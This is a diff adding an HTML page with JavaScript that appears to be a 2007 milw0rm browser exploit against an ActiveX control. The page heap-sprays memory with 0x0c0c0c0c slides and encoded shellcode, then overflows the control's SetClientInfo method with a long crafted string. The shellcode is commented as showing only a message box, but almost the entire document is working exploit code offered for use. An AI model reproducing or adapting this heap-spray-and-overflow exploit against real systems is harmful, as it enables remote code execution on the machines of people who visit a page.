@@ -1,0 +1,37 @@
+<OBJECT id=target classid=clsid:7D1425D4-E2FC-4A52-BDA9-B9DCAC5EF574></OBJECT>
+<SCRIPT>
+document.write("<meta http-equiv=\"refresh\" content=\"1, " + window.location.href + "\"></meta>");
+var heapSprayToAddress = 0x0c0c0c0c;
+var shellcode = unescape(
+//just pop up a MessageBox
+"%u0eeb%u4b5b%uc933%ubfb1%u3480%ufe0b%ufae2%u05eb%uede8%uffff%u17ff%ufe67%ufefe%u94a1%ua7ce%u759a%u75ff%uf2be%u8e75%u53e2%u9675%u75f6%u9409%ua7fc%uc716%ufefe%u1cfe%u9607%ucccd%ufefe%u8b96%u9b8d%uaa8c%ue801%u166b%ufeda%ufefe%u96ac%u91d0%u998c%u9096%uce8a%u9693%u8edd%uca96%u8896%u9791%u759a%u7322%uf2b8%uadac%uacae%ua801%u01f6%ufaa8%ua8af%u8b75%u75c2%ud08a%ufd86%ua80b%u8875%ufdde%ucd0b%ub737%u53bf%u3bfd%u25cd%u40f1%uc4ee%u8a28%u3ff6%uf935%u24fd%u15be%uc50f%u8be1%ua019%ua075%ufdda%u9823%uf275%u75b5%ue2a0%u23fd%ufa75%ufd75%u553b%ua7a0%u163d%u019c%u0101%u8acc%uf26f%u7187%u9e32%uf494%ue0c6%u3344%u4d2e%u3a4b%u968d%u929b%u9d92%u9a91%ufe9b"
+);
+
+var heapBlockSize = 0x100000;
+var payLoadSize = shellcode.length * 2;
+var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
+var spraySlide = unescape("%u0c0c%u0c0c");
+spraySlide = getSpraySlide(spraySlide,spraySlideSize);
+heapBlocks = (heapSprayToAddress - 0x100000)/heapBlockSize;
+memory = new Array();
+
+for (i=0;i<heapBlocks;i++)
+{
+        memory[i] = spraySlide + shellcode;
+}
+
+function getSpraySlide(spraySlide, spraySlideSize)
+{
+    while (spraySlide.length*2<spraySlideSize)
+    {
+        spraySlide += spraySlide;
+    }
+    spraySlide = spraySlide.substring(0,spraySlideSize/2);
+    return spraySlide;
+}
+
+s="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+"\x0c\x0c\x0c\x0c"
+target.SetClientInfo(1, s, 1) 
+</SCRIPT>
+
+# milw0rm.com [2007-09-07]
